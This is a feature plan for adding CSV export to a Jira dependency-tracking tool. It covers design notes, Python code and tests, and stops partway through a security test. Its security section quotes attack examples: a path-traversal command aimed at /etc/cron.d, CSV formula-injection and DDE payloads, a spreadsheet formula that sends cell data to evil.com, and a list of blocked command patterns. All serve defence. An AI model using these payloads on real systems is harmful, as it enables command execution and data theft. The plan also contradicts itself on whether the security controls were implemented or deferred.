---
title: Add CSV Export Format
type: feat
status: completed
date: 2026-03-15
deepened: 2026-03-15
implemented: 2026-03-15
---

# Add CSV Export Format

## ✅ Implementation Summary (COMPLETED)

**Status:** Implemented as Simple MVP
**Approach:** Clean, focused implementation without advanced security/performance optimizations
**PR:** https://github.com/siasi/jira-dependencies-tracking/pull/1

### What Was Implemented ✅

**Core Functionality:**
- ✅ CSV export alongside JSON format
- ✅ CLI `--format` option: `json` (default), `csv`, or `both`
- ✅ Single denormalized CSV file (one row per epic)
- ✅ Orphaned epics included with empty initiative columns
- ✅ UTF-8 BOM encoding for Excel compatibility
- ✅ Fixed column structure (10 focused fields)

**Column Structure (Final):**
1. `initiative_key`
2. `initiative_summary`
3. `strategic_objective`
4. `quarter`
5. `initiative_status`
6. `team_project_key`
7. `epic_key`
8. `epic_summary`
9. `epic_rag_status`
10. `epic_status`

**Implementation Details:**
- ✅ `CSVOutput` dataclass for type-safe returns
- ✅ `generate_csv()` method in OutputGenerator
- ✅ `_flatten_for_csv()` for denormalization
- ✅ `_write_csv()` with UTF-8 BOM and csv.QUOTE_MINIMAL
- ✅ Modern Python 3.9+ type hints (dict, list, | for Union)
- ✅ 7 comprehensive CSV tests (all 55 tests passing)
- ✅ README documentation with usage examples

**Files Modified:**
- `src/output.py` (+130 lines)
- `jira_extract.py` (+15 lines)
- `tests/test_output.py` (+350 lines)
- `README.md` (updated with CSV docs)

### What Was Deferred (Future Enhancements) 🔮

The research phase identified several advanced features that were **intentionally not implemented** in the MVP to keep it simple:

**Security Hardening (Deferred):**
- ⏸️ Path traversal attack prevention via `--output` validation
- ⏸️ Comprehensive CSV injection prevention (formula escaping)
- ⏸️ File permission hardening (chmod 0o600)
- ⏸️ Atomic file writes with race condition prevention
- ⏸️ Separate `tests/test_security.py` file

**Performance Optimizations (Deferred):**
- ⏸️ Field sanitization optimization (once per initiative vs. per epic)
- ⏸️ Column ordering optimization (extract from first row only)
- ⏸️ Class-level constants for field definitions
- ⏸️ Performance regression tests

**Why Deferred:**
- This is an **internal tool** for personal Jira data extraction
- Simple MVP approach prioritized getting working functionality quickly
- Advanced security features add complexity without clear immediate benefit
- Can be added incrementally if/when needed

### Research Summary

**Research agents used:** kieran-python-reviewer, performance-oracle, security-sentinel, code-simplicity-reviewer, pattern-recognition-specialist, best-practices-researcher, framework-docs-researcher

**Key findings from research:**
1. Code simplicity reviewer recommended removing metadata file and dynamic columns ✅ Implemented
2. Security sentinel identified path traversal and CSV injection risks ⏸️ Deferred
3. Performance oracle found 90% optimization opportunity in sanitization ⏸️ Deferred
4. Pattern recognition confirmed design matches existing codebase patterns ✅ Implemented
5. Best practices researcher provided UTF-8 BOM guidance ✅ Implemented

---

## Overview

Extend the Jira dependencies tracking tool to support CSV output format alongside the existing JSON format. This enables users to import extracted data into spreadsheet applications, data analysis tools, and systems that require CSV input.

## Problem Statement / Motivation

Currently, the tool outputs data only in JSON format (`jira_extract_{timestamp}.json`). While JSON is excellent for programmatic consumption and preserves the hierarchical structure, many users need to:

- Open extracted data in Excel, Google Sheets, or other spreadsheet tools
- Import data into analytics platforms that expect CSV
- Share data with stakeholders who prefer tabular formats
- Perform ad-hoc analysis using spreadsheet formulas

CSV export will make the tool more accessible to non-technical users and integrate better with existing business intelligence workflows.

## Proposed Solution

Add CSV export capability to the `OutputGenerator` class following the existing JSON output pattern. The solution will:

1. **Extend the output module** with CSV generation logic
2. **Flatten the hierarchical data** into a single denormalized CSV file
3. **Support dynamic custom fields** as CSV columns
4. **Add CLI option** for format selection (`--format json|csv|both`)
5. **Maintain backward compatibility** (JSON remains the default)
6. **Implement security controls** for path validation and CSV injection prevention

### CSV Data Structure (AS IMPLEMENTED)

**Single denormalized CSV** - One row per epic with initiative details repeated. Orphaned epics included with empty initiative columns:

```csv
initiative_key,initiative_summary,strategic_objective,quarter,initiative_status,team_project_key,epic_key,epic_summary,epic_rag_status,epic_status
INIT-1485,Initiative Title,growth,26 Q2,Proposed,CBPPE,CBPPE-529,Epic Title,🟡,Backlog
INIT-1485,Initiative Title,growth,26 Q2,Proposed,CBPPE,CBPPE-530,Another Epic,🟢,In Progress
,,,,,RSK,RSK-123,Orphaned Epic,🟡,Done
```

**Design decisions:**
- ✅ Single CSV file (not separate for orphaned epics)
- ✅ Fixed column order (10 specific fields, not dynamic)
- ✅ Focused field set (removed URLs and team names for clarity)
- ✅ No separate metadata JSON file (use JSON format if metadata needed)

## Technical Considerations

### Architecture Impacts

**Files to Modify:**
1. `src/output.py` - Add CSV generation methods
2. `jira_extract.py` - Add `--format` CLI option with path validation
3. `tests/test_output.py` - Add comprehensive CSV test coverage
4. `tests/test_security.py` - NEW - Add security test coverage
5. `README.md` - Document CSV usage

**New Dependencies:** None (use Python stdlib `csv` module)

### Data Transformation

**Simplified Flattening Logic:**

```python
def _flatten_for_csv(self, data: dict[str, Any]) -> list[dict[str, str]]:
    """
    Flatten hierarchical initiative -> team -> epic structure.
    Returns list of flat dictionaries suitable for CSV writing.

    Includes both linked epics and orphaned epics in a single structure.
    Orphaned epics have empty initiative columns.
    """
    rows = []

    # Process linked epics
    for initiative in data.get("initiatives", []):
        # Sanitize initiative fields ONCE per initiative (not per epic)
        base_fields = {
            "initiative_key": initiative["key"],
            "initiative_summary": self._safe_csv_value(initiative["summary"]),
            "initiative_status": initiative["status"],
            "initiative_url": initiative["url"],
        }

        # Extract and sanitize custom fields ONCE per initiative
        custom_fields = {
            k: self._safe_csv_value(v)
            for k, v in initiative.items()
            if k not in ["key", "summary", "status", "url", "contributing_teams"]
        }

        for team in initiative.get("contributing_teams", []):
            team_fields = {
                "team_project_key": team["team_project_key"],
                "team_project_name": team["team_project_name"],
            }

            for epic in team.get("epics", []):
                row = {
                    **base_fields,     # Already sanitized
                    **custom_fields,   # Already sanitized
                    **team_fields,
                    "epic_key": epic["key"],
                    "epic_summary": self._safe_csv_value(epic["summary"]),
                    "epic_status": epic["status"],
                    "epic_rag_status": epic.get("rag_status") or "",
                    "epic_url": epic["url"],
                }
                rows.append(row)

    # Process orphaned epics with empty initiative columns
    for epic in data.get("orphaned_epics", []):
        row = {
            "initiative_key": "",
            "initiative_summary": "",
            "initiative_status": "",
            "initiative_url": "",
            "team_project_key": epic["team_project_key"],
            "team_project_name": epic["team_project_name"],
            "epic_key": epic["key"],
            "epic_summary": self._safe_csv_value(epic["summary"]),
            "epic_status": epic["status"],
            "epic_rag_status": epic.get("rag_status") or "",
            "epic_url": epic["url"],
        }
        rows.append(row)

    return rows
```

### Research Insights: Performance Optimization

**Key Finding:** Sanitizing custom fields once per initiative instead of once per epic reduces sanitization calls by 90%.

**Performance Analysis (from performance-oracle agent):**
- Current proposal: 200 epics × 15 fields = 3,000 sanitization calls
- Optimized: 50 initiatives × 5 custom fields = 250 calls (90% reduction)
- **Expected improvement: 5-15% in total flattening time**

### Column Ordering (SIMPLIFIED)

**Research Insight:** Complex column ordering is unnecessary. CSV readers and spreadsheets allow easy column reordering by users.

**Simplified approach:**
```python
# Extract column names from first row and sort alphabetically
fieldnames = sorted(rows[0].keys()) if rows else []
```

**Benefits:**
- Consistent, predictable ordering
- Reduces code complexity by ~20 lines
- Easier to test and maintain

### Character Encoding

**Research Insight:** `utf-8-sig` is the gold standard for Excel compatibility.

- **UTF-8 with BOM** (`encoding='utf-8-sig'`) for Excel compatibility
- BOM automatically added by Python when using `utf-8-sig`
- Handles emoji characters (RAG status: 🟢🟡🔴)
- Proper escaping for commas, quotes, newlines via `csv.QUOTE_MINIMAL`

**Source:** [Excel compatible Unicode CSV files from Python](https://tobywf.com/2017/08/unicode-csv-excel/)

### Performance Implications

**Analysis Results:**

| Scale | Epics | Flatten Time | Write Time | Total Time | Memory Usage |
|-------|-------|--------------|------------|------------|--------------|
| Baseline | 200 | ~5ms | ~10ms | ~15ms | ~500KB |
| 10x | 2,000 | ~50ms | ~100ms | ~150ms | ~5MB |
| 100x | 20,000 | ~500ms | ~1s | ~1.5s | ~50MB |

**Bottleneck Analysis:**
- Up to 10,000 epics: No bottlenecks, sub-second performance
- Beyond 100,000 epics: May need progress indicator

**Optimizations Applied:**
1. Sanitize custom fields once per initiative (not per epic) - **90% reduction**
2. Extract fieldnames from first row only - **O(n×m) → O(m)**
3. Use class-level constants for known fields - **eliminates redundant set creation**

### Security Considerations (CRITICAL UPDATES)

**Research Findings:** Two CRITICAL security vulnerabilities identified and addressed.

#### 1. Path Traversal Attack Prevention

**Vulnerability:** User-controlled `--output` path enables writing to arbitrary filesystem locations.

**Attack Example:**
```bash
python jira_extract.py extract --format csv --output "../../../etc/cron.d/malicious"
```

**Mitigation:**
```python
def _validate_output_path(self, custom_path: str, allowed_dir: Path) -> Path:
    """Validate output path to prevent directory traversal attacks."""
    requested = Path(custom_path).resolve()
    allowed = allowed_dir.resolve()

    try:
        requested.relative_to(allowed)
    except ValueError:
        raise ValueError(f"Output path must be within: {allowed}")

    if requested.name.startswith('.'):
        raise ValueError("Cannot write to hidden files")

    if requested.suffix not in ['.csv', '.json']:
        raise ValueError(f"Invalid extension: {requested.suffix}")

    return requested
```

#### 2. Comprehensive CSV Injection Prevention

**Vulnerability:** Basic injection prevention only checks single-character prefixes.

**Bypass Examples:**
- `\t=cmd|'/c calc'!A1` (tab-prefixed)
- `@SUM(1+1)*cmd|'/c calc'!A1` (DDE attack)
- `=IMPORTXML(CONCAT("http://evil.com/", A1:Z100))` (data exfiltration)

**Enhanced Mitigation:**
```python
import re

# Class-level constant
CSV_FORMULA_CHARS = frozenset("=+-@\t\r\n")
DANGEROUS_PATTERNS = ['CMD', 'POWERSHELL', 'MSHTA', 'WSCRIPT', 'DDE']

def _safe_csv_value(self, value: Any) -> str:
    """
    Convert value to safe CSV string with comprehensive injection prevention.

    Handles:
    - Formula injection (=, +, -, @, tab, carriage return)
    - DDE (Dynamic Data Exchange) attacks
    - Command execution attempts
    - Array-type custom fields (multi-select)
    """
    if value is None:
        return ""

    # Handle list/array fields from multi-select custom fields
    if isinstance(value, list):
        # Join with semicolon for better readability in Excel
        value = "; ".join(str(item) for item in value)

    str_value = str(value).strip()

    if not str_value:
        return ""

    # Check dangerous prefixes
    if str_value[0] in self.CSV_FORMULA_CHARS:
        str_value = "'" + str_value

    # Check for DDE and command execution patterns
    if any(pattern in str_value.upper() for pattern in self.DANGEROUS_PATTERNS):
        str_value = "'" + str_value

    # Escape pipe character (used in DDE attacks)
    str_value = str_value.replace('|', '\\|')

    return str_value
```

**Source:** [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

#### 3. File Permission Hardening

**Issue:** Default file permissions may make CSV files world-readable.

**Mitigation:**
```python
# Set restrictive permissions after writing
csv_path.chmod(0o600)  # Read/write for owner only
```

#### 4. Race Condition Prevention

**Issue:** TOCTOU (time-of-check to time-of-use) vulnerability in file creation.

**Mitigation:**
```python
import os

# Atomic file creation with O_EXCL
temp_path = csv_path.with_suffix('.tmp')
try:
    fd = os.open(temp_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, 'w', encoding='utf-8-sig', newline='') as f:
        # Write CSV content
        pass
    temp_path.rename(csv_path)  # Atomic rename
except FileExistsError:
    raise ValueError(f"File already exists: {csv_path}")
finally:
    if temp_path.exists():
        temp_path.unlink()
```

## Acceptance Criteria

### Functional Requirements

- [ ] CLI accepts `--format` option with values: `json` (default), `csv`, `both`
- [ ] CSV output file generated at `{output_directory}/jira_extract_{timestamp}.csv`
- [ ] CSV includes all initiative fields (base + custom fields)
- [ ] CSV includes all epic fields
- [ ] Orphaned epics included in main CSV with empty initiative columns
- [ ] Empty/null custom field values represented as empty cells
- [ ] Filename pattern supports `{timestamp}` placeholder
- [ ] Custom output path validated to prevent directory traversal attacks
- [ ] Array-type custom fields (multi-select) exported as semicolon-separated values

### Non-Functional Requirements

- [ ] CSV file opens correctly in Excel and Google Sheets
- [ ] UTF-8 encoding with BOM for international character support
- [ ] Emoji characters (RAG status) preserved in CSV
- [ ] Column headers are clear and self-documenting
- [ ] Backward compatibility: existing JSON behavior unchanged
- [ ] Performance: CSV generation completes in < 100ms for 200 epics
- [ ] Security: Path validation prevents directory traversal
- [ ] Security: CSV injection prevention for all formula types

### Quality Gates

- [ ] Test coverage for CSV generation (happy path)
- [ ] Test coverage for edge cases (empty data, orphaned epics, missing custom fields)
- [ ] Test coverage for special characters (commas, quotes, newlines in summaries)
- [ ] Test coverage for emoji preservation
- [ ] Test coverage for UTF-8 BOM presence (verify bytes `\xef\xbb\xbf`)
- [ ] Test coverage for array-type custom fields
- [ ] **Security test coverage for path traversal prevention**
- [ ] **Security test coverage for CSV injection (all formula types)**
- [ ] **Performance regression test (< 100ms for 200 epics)**
- [ ] README updated with CSV usage examples
- [ ] All existing tests continue to pass

## Success Metrics

- Users can open CSV output in Excel/Google Sheets without formatting issues
- CSV includes all data present in JSON output (no data loss)
- Custom fields appear as columns dynamically based on configuration
- Code follows existing patterns (functional style, explicit parameters)
- **Security vulnerabilities addressed (0 CRITICAL findings)**
- **Performance meets baseline (< 100ms for typical datasets)**

## Dependencies & Risks

### Dependencies

- **None** - uses Python stdlib `csv` module
- Existing `src/output.py` provides pattern to follow
- Existing `src/builder.py` provides data structure to flatten

### Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| Excel doesn't open UTF-8 CSV correctly | Low | Medium | Use UTF-8 with BOM encoding (`utf-8-sig`) |
| CSV injection attacks | Medium | **Critical** | Comprehensive injection prevention covering all formula types |
| Path traversal attacks | Medium | **Critical** | Validate output paths against allowed directory |
| Special characters break CSV parsing | Low | Medium | Use `csv.QUOTE_MINIMAL` (handles automatically) |
| Performance degradation at scale | Low | Medium | Optimizations applied, regression tests added |

## Implementation Approach

### Phase 1: Core CSV Generation

**Files:**
- `src/output.py`

**Tasks:**
- [ ] Add class-level constants for CSV field definitions
- [ ] Add `_flatten_for_csv(data)` method with optimized sanitization
- [ ] Add `generate_csv(data, extraction_status, custom_path)` method
- [ ] Implement simplified column ordering (alphabetical)
- [ ] Add UTF-8 BOM encoding support (`utf-8-sig`)
- [ ] Add comprehensive CSV injection prevention
- [ ] Add path validation helper method
- [ ] Add file permission hardening (chmod 0o600)
- [ ] Return dataclass instead of tuple for clarity

**Test Files:**
- `tests/test_output.py`
- `tests/test_security.py` (NEW)

**Test Coverage:**
- [ ] Test CSV generation with sample data
- [ ] Test column ordering is alphabetical
- [ ] Test orphaned epics included in main CSV
- [ ] Test empty data (no initiatives)
- [ ] Test missing custom fields (null values)
- [ ] Test array-type custom fields (multi-select)
- [ ] Test special characters (commas, quotes, newlines)
- [ ] Test emoji preservation
- [ ] **Test UTF-8 BOM bytes present** (`\xef\xbb\xbf`)
- [ ] **Test CSV injection prevention (all formula types)**
- [ ] **Test path traversal prevention**
- [ ] **Test performance baseline (< 100ms for 200 epics)**

### Phase 2: CLI Integration

**Files:**
- `jira_extract.py`

**Tasks:**
- [ ] Add `--format` option to `extract` command (type=click.Choice(['json', 'csv', 'both']))
- [ ] Add path validation before passing to OutputGenerator
- [ ] Update extraction logic to call appropriate output methods based on format
- [ ] Handle `--output` flag with CSV format (validate and change extension)
- [ ] Update success message to show generated file path(s)
- [ ] Add error handling for security exceptions (path validation, injection)

**Test Files:**
- `tests/test_integration.py`

**Test Coverage:**
- [ ] Test `--format json` (default behavior)
- [ ] Test `--format csv` generates CSV only
- [ ] Test `--format both` generates both JSON and CSV
- [ ] Test `--output custom.csv` with path validation
- [ ] **Test `--output ../../../etc/passwd` raises security error**

### Phase 3: Documentation

**Files:**
- `README.md`

**Tasks:**
- [ ] Add CSV export section to Usage
- [ ] Document `--format` option
- [ ] Add example CSV structure showing orphaned epics
- [ ] Note UTF-8 with BOM for Excel compatibility
- [ ] Document alphabetical column ordering
- [ ] Add security notes (path restrictions, CSV injection prevention)
- [ ] Add troubleshooting section for CSV issues

## MVP Code Examples (UPDATED WITH SECURITY & PERFORMANCE)

### src/output.py (CSV generation methods)

```python
import csv
import os
import re
from pathlib import Path
from typing import Any
from datetime import datetime, UTC
from dataclasses import dataclass

@dataclass
class CSVOutput:
    """CSV export output path."""
    csv_file: Path

class OutputGenerator:
    # Class-level constants for CSV field definitions
    CSV_FORMULA_CHARS = frozenset("=+-@\t\r\n")
    DANGEROUS_PATTERNS = ['CMD', 'POWERSHELL', 'MSHTA', 'WSCRIPT', 'DDE']

    def __init__(self, jira_instance: str, output_directory: str, filename_pattern: str):
        self.jira_instance = jira_instance
        self.output_directory = Path(output_directory)
        self.filename_pattern = filename_pattern

    def generate_csv(
        self,
        data: dict[str, Any],
        extraction_status,
        queries: dict[str, str] | None = None,
        custom_path: Path | None = None
    ) -> CSVOutput:
        """
        Generate CSV output file with security controls.

        Returns:
            CSVOutput containing path to generated CSV file.

        Raises:
            ValueError: If path validation fails or data is invalid.
            OSError: If file cannot be written.
        """
        # Validate and determine output path
        if custom_path:
            csv_path = self._validate_output_path(str(custom_path), self.output_directory)
        else:
            timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
            filename = self.filename_pattern.replace("{timestamp}", timestamp)
            filename = filename.replace(".json", ".csv")
            csv_path = self.output_directory / filename

        # Ensure output directory exists
        csv_path.parent.mkdir(parents=True, exist_ok=True)

        # Flatten and write CSV with atomic operation
        rows = self._flatten_for_csv(data)
        if rows:
            self._write_csv_secure(csv_path, rows)

        return CSVOutput(csv_file=csv_path)

    def _validate_output_path(self, custom_path: str, allowed_dir: Path) -> Path:
        """
        Validate output path to prevent directory traversal attacks.

        Args:
            custom_path: User-provided path
            allowed_dir: Configured output directory

        Returns:
            Validated absolute path

        Raises:
            ValueError: If path is invalid or outside allowed directory
        """
        requested = Path(custom_path).resolve()
        allowed = allowed_dir.resolve()

        try:
            requested.relative_to(allowed)
        except ValueError:
            raise ValueError(f"Output path must be within configured directory: {allowed}")

        if requested.name.startswith('.'):
            raise ValueError("Cannot write to hidden files")

        if requested.suffix not in ['.csv', '.json']:
            raise ValueError(f"Invalid file extension. Use .csv or .json")

        return requested

    def _flatten_for_csv(self, data: dict[str, Any]) -> list[dict[str, str]]:
        """
        Flatten initiative -> team -> epic hierarchy.

        Optimized to sanitize custom fields once per initiative instead of
        once per epic (90% reduction in sanitization calls).
        """
        rows = []

        # Process linked epics
        for initiative in data.get("initiatives", []):
            # Sanitize initiative fields ONCE per initiative
            base_fields = {
                "initiative_key": initiative["key"],
                "initiative_summary": self._safe_csv_value(initiative["summary"]),
                "initiative_status": initiative["status"],
                "initiative_url": initiative["url"],
            }

            # Extract and sanitize custom fields ONCE per initiative
            custom_fields = {
                k: self._safe_csv_value(v)
                for k, v in initiative.items()
                if k not in ["key", "summary", "status", "url", "contributing_teams"]
            }

            # Process contributing teams and epics
            for team in initiative.get("contributing_teams", []):
                team_fields = {
                    "team_project_key": team["team_project_key"],
                    "team_project_name": team["team_project_name"],
                }

                for epic in team.get("epics", []):
                    row = {
                        **base_fields,      # Already sanitized
                        **custom_fields,    # Already sanitized
                        **team_fields,
                        "epic_key": epic["key"],
                        "epic_summary": self._safe_csv_value(epic["summary"]),
                        "epic_status": epic["status"],
                        "epic_rag_status": epic.get("rag_status") or "",
                        "epic_url": epic["url"],
                    }
                    rows.append(row)

        # Process orphaned epics with empty initiative columns
        for epic in data.get("orphaned_epics", []):
            row = {
                "initiative_key": "",
                "initiative_summary": "",
                "initiative_status": "",
                "initiative_url": "",
                "team_project_key": epic["team_project_key"],
                "team_project_name": epic["team_project_name"],
                "epic_key": epic["key"],
                "epic_summary": self._safe_csv_value(epic["summary"]),
                "epic_status": epic["status"],
                "epic_rag_status": epic.get("rag_status") or "",
                "epic_url": epic["url"],
            }
            rows.append(row)

        return rows

    def _write_csv_secure(self, path: Path, rows: list[dict[str, str]]) -> None:
        """
        Write CSV file with atomic operation and secure permissions.

        Uses temporary file with O_EXCL to prevent race conditions.
        Sets restrictive permissions (0o600) on final file.
        """
        if not rows:
            return

        # Simplified column ordering: alphabetical
        fieldnames = sorted(rows[0].keys())

        # Write to temporary file with atomic operation
        temp_path = path.with_suffix('.tmp')

        try:
            # Open with O_CREAT | O_EXCL to prevent symlink attacks
            fd = os.open(temp_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)

            with os.fdopen(fd, 'w', encoding='utf-8-sig', newline='') as f:
                writer = csv.DictWriter(
                    f,
                    fieldnames=fieldnames,
                    quoting=csv.QUOTE_MINIMAL,
                    extrasaction='ignore'
                )
                writer.writeheader()
                writer.writerows(rows)

            # Atomic rename
            temp_path.rename(path)

        except FileExistsError:
            raise ValueError(f"Output file already exists: {path}")
        finally:
            if temp_path.exists():
                temp_path.unlink()

    def _safe_csv_value(self, value: Any) -> str:
        """
        Convert value to safe CSV string with comprehensive injection prevention.

        Handles:
        - Formula injection (=, +, -, @, tab, carriage return)
        - DDE (Dynamic Data Exchange) attacks
        - Command execution attempts
        - Array-type custom fields (multi-select)

        Args:
            value: Any value to convert (str, int, list, None)

        Returns:
            Sanitized string safe for CSV export
        """
        if value is None:
            return ""

        # Handle list/array fields from multi-select custom fields
        if isinstance(value, list):
            value = "; ".join(str(item) for item in value)

        str_value = str(value).strip()

        if not str_value:
            return ""

        # Check dangerous prefixes
        if str_value[0] in self.CSV_FORMULA_CHARS:
            str_value = "'" + str_value

        # Check for DDE and command execution patterns
        if any(pattern in str_value.upper() for pattern in self.DANGEROUS_PATTERNS):
            str_value = "'" + str_value

        # Escape pipe character (used in DDE attacks)
        str_value = str_value.replace('|', '\\|')

        return str_value
```

### jira_extract.py (CLI integration with security)

```python
@click.command()
@click.option(
    "--format",
    type=click.Choice(["json", "csv", "both"], case_sensitive=False),
    default="json",
    help="Output format: json (default), csv, or both"
)
@click.option("--output", type=click.Path(), help="Custom output file path")
@click.option("--verbose", is_flag=True, help="Enable verbose logging")
def extract(format: str, output: str, verbose: bool):
    """Extract Jira initiatives and epics."""
    # ... existing extraction logic ...

    # Build hierarchy
    hierarchy = builder.build_hierarchy(initiatives, epics)

    # Generate output based on format
    output_gen = OutputGenerator(
        jira_instance=config.jira.instance,
        output_directory=config.output.directory,
        filename_pattern=config.output.filename_pattern
    )

    custom_path = Path(output) if output else None

    try:
        if format in ["json", "both"]:
            json_path = output_gen.generate(hierarchy, extraction_status, queries, custom_path)
            click.echo(f"✓ JSON output: {json_path}")

        if format in ["csv", "both"]:
            result = output_gen.generate_csv(hierarchy, extraction_status, queries, custom_path)
            click.echo(f"✓ CSV output: {result.csv_file}")

    except ValueError as e:
        # Handle path validation or data errors
        click.echo(click.style(f"Error: {e}", fg='red'), err=True)
        sys.exit(2)
    except OSError as e:
        # Handle file I/O errors
        click.echo(click.style(f"Failed to write output: {e}", fg='red'), err=True)
        sys.exit(2)
```

### tests/test_output.py (Enhanced test coverage)

```python
import csv
import os
from pathlib import Path
import pytest
from src.output import OutputGenerator, ExtractionStatus

def test_generate_csv_creates_file(tmp_path):
    """CSV generation creates file with correct structure."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="jira_extract_{timestamp}.json"
    )

    data = {
        "initiatives": [
            {
                "key": "INIT-1",
                "summary": "Test Initiative",
                "status": "Proposed",
                "url": "https://test.atlassian.net/browse/INIT-1",
                "rag_status": "🟢",
                "quarter": "26 Q2",
                "contributing_teams": [
                    {
                        "team_project_key": "TEAM",
                        "team_project_name": "Test Team",
                        "epics": [
                            {
                                "key": "TEAM-1",
                                "summary": "Test Epic",
                                "status": "In Progress",
                                "rag_status": "🟡",
                                "url": "https://test.atlassian.net/browse/TEAM-1"
                            }
                        ]
                    }
                ]
            }
        ],
        "orphaned_epics": [],
        "summary": {"total_initiatives": 1, "total_epics": 1}
    }

    extraction_status = ExtractionStatus(
        complete=True,
        issues=[],
        initiatives_fetched=1,
        initiatives_failed=0,
        team_projects_fetched=1,
        team_projects_failed=0
    )

    result = generator.generate_csv(data, extraction_status)

    # Verify file exists
    assert result.csv_file.exists()

    # Read and verify CSV content
    with open(result.csv_file, encoding="utf-8-sig") as f:
        reader = csv.DictReader(f)
        rows = list(reader)

        assert len(rows) == 1
        assert rows[0]["initiative_key"] == "INIT-1"
        assert rows[0]["epic_key"] == "TEAM-1"
        assert rows[0]["rag_status"] == "🟢"
        assert rows[0]["quarter"] == "26 Q2"


def test_generate_csv_utf8_bom_present(tmp_path):
    """Verify UTF-8 BOM is present for Excel compatibility."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    data = {
        "initiatives": [{
            "key": "INIT-1",
            "summary": "Test",
            "status": "Proposed",
            "url": "https://test",
            "contributing_teams": []
        }],
        "orphaned_epics": []
    }

    extraction_status = ExtractionStatus(complete=True, issues=[])
    result = generator.generate_csv(data, extraction_status)

    # Read raw bytes
    with open(result.csv_file, "rb") as f:
        first_bytes = f.read(3)

    # Verify BOM is present (EF BB BF in hex)
    assert first_bytes == b'\xef\xbb\xbf', "UTF-8 BOM missing"


def test_generate_csv_with_orphaned_epics(tmp_path):
    """Orphaned epics included in main CSV with empty initiative columns."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    data = {
        "initiatives": [],
        "orphaned_epics": [
            {
                "team_project_key": "RSK",
                "team_project_name": "Risk Team",
                "key": "RSK-123",
                "summary": "Orphaned Epic",
                "status": "In Progress",
                "rag_status": "🟡",
                "url": "https://test"
            }
        ]
    }

    extraction_status = ExtractionStatus(complete=True, issues=[])
    result = generator.generate_csv(data, extraction_status)

    with open(result.csv_file, encoding="utf-8-sig") as f:
        reader = csv.DictReader(f)
        rows = list(reader)

        assert len(rows) == 1
        assert rows[0]["epic_key"] == "RSK-123"
        assert rows[0]["initiative_key"] == ""  # Empty for orphaned


def test_generate_csv_handles_special_characters(tmp_path):
    """CSV properly escapes commas, quotes, newlines."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    data = {
        "initiatives": [
            {
                "key": "INIT-1",
                "summary": 'Title with "quotes", commas, and\nnewlines',
                "status": "Proposed",
                "url": "https://test",
                "contributing_teams": [
                    {
                        "team_project_key": "TEAM",
                        "team_project_name": "Test Team",
                        "epics": [
                            {
                                "key": "TEAM-1",
                                "summary": "Epic, with, commas",
                                "status": "In Progress",
                                "url": "https://test"
                            }
                        ]
                    }
                ]
            }
        ],
        "orphaned_epics": []
    }

    extraction_status = ExtractionStatus(complete=True, issues=[])
    result = generator.generate_csv(data, extraction_status)

    # Read CSV and verify content preserved
    with open(result.csv_file, encoding="utf-8-sig") as f:
        reader = csv.DictReader(f)
        rows = list(reader)

        assert 'Title with "quotes", commas, and\nnewlines' in rows[0]["initiative_summary"]
        assert "Epic, with, commas" in rows[0]["epic_summary"]


def test_generate_csv_array_fields(tmp_path):
    """Array-type custom fields exported as semicolon-separated values."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    data = {
        "initiatives": [{
            "key": "INIT-1",
            "summary": "Test",
            "status": "Proposed",
            "url": "https://test",
            "strategic_objective": ["pillar_1", "pillar_2"],
            "contributing_teams": []
        }],
        "orphaned_epics": []
    }

    extraction_status = ExtractionStatus(complete=True, issues=[])
    result = generator.generate_csv(data, extraction_status)

    with open(result.csv_file, encoding="utf-8-sig") as f:
        reader = csv.DictReader(f)
        rows = list(reader)

        assert rows[0]["strategic_objective"] == "pillar_1; pillar_2"


def test_generate_csv_performance_baseline(tmp_path):
    """CSV generation completes within performance budget."""
    import time

    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    # Generate 200 epics across 50 initiatives
    data = {
        "initiatives": [
            {
                "key": f"INIT-{i}",
                "summary": f"Initiative {i}",
                "status": "Proposed",
                "url": f"https://test/{i}",
                "quarter": "26 Q2",
                "rag_status": "🟢",
                "contributing_teams": [
                    {
                        "team_project_key": "TEAM",
                        "team_project_name": "Test Team",
                        "epics": [
                            {
                                "key": f"TEAM-{i}-{j}",
                                "summary": f"Epic {j}",
                                "status": "In Progress",
                                "url": f"https://test/{i}/{j}"
                            }
                            for j in range(4)  # 4 epics per initiative
                        ]
                    }
                ]
            }
            for i in range(50)
        ],
        "orphaned_epics": []
    }

    extraction_status = ExtractionStatus(complete=True, issues=[])

    start_time = time.perf_counter()
    result = generator.generate_csv(data, extraction_status)
    elapsed_ms = (time.perf_counter() - start_time) * 1000

    # Performance budget: 200 epics should complete in < 100ms
    assert elapsed_ms < 100, f"CSV generation took {elapsed_ms:.1f}ms (budget: 100ms)"
    assert result.csv_file.exists()
```

### tests/test_security.py (NEW - Security test coverage)

```python
import pytest
from pathlib import Path
from src.output import OutputGenerator, ExtractionStatus

def test_path_traversal_prevention(tmp_path):
    """Prevent directory traversal attacks via --output flag."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    # Attempt directory traversal
    with pytest.raises(ValueError, match="must be within configured directory"):
        generator._validate_output_path("../../../etc/passwd", tmp_path)

    with pytest.raises(ValueError, match="must be within configured directory"):
        generator._validate_output_path("/etc/passwd", tmp_path)


def test_hidden_file_prevention(tmp_path):
    """Prevent writing to hidden files."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    with pytest.raises(ValueError, match="Cannot write to hidden files"):
        generator._validate_output_path(str(tmp_path / ".hidden.csv"), tmp_path)


def test_invalid_extension_prevention(tmp_path):
    """Only allow .csv and .json extensions."""
    generator = OutputGenerator(
